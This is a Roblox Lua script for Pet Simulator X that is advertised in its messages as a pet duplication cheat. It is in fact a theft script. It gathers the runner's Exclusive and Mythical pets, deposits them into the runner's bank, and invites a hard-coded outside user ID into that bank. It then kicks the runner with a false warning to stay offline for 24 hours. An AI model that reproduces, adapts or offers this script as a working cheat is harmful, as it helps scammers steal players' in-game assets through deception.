local args = {  [1] = "Starting", [2] = "All" }
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
 lib.Message.New("You are using script for Pet Sim X" , "Made by ScriptxTeam" , "Start Process");
 
local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
local mybanks = lib.Network.Invoke("get my banks")
local PetsList = {}
for i,v in pairs(lib.Save.Get().Pets) do
    local v2 = lib.Directory.Pets[v.id];
    if v2.rarity == "Exclusive" or v2.rarity == "Mythical" and v.dm or v2.rarity == "Mythical" and v.r then
        table.insert(PetsList, v.uid);
    end
end
local request, request2 = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList);
if request then
    task.spawn(lib.Network.Invoke,'request world', 'Fantasy') 
    warn("Dupe Script 2022")
else
end
 
if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], 2807334080) then
game.Players.LocalPlayer:Kick("Don't join the game for the next 24 hrs to stop the pets from getting deleted") lib.Message.New("")
else
    game.Players.LocalPlayer:Kick("Don't join the game for the next 24 hrs to stop the pets from getting deleted")
function comma_value(amount)
 
  local formatted = amount
 
  while true do
 
    formatted, k = string.gsub(formatted, "^(-?%d+)(%d%d%d)", '%1,%2')
 
    if (k == 0) then
 
      break
 
    end
 
  end
 
  return formatted
 
end
end
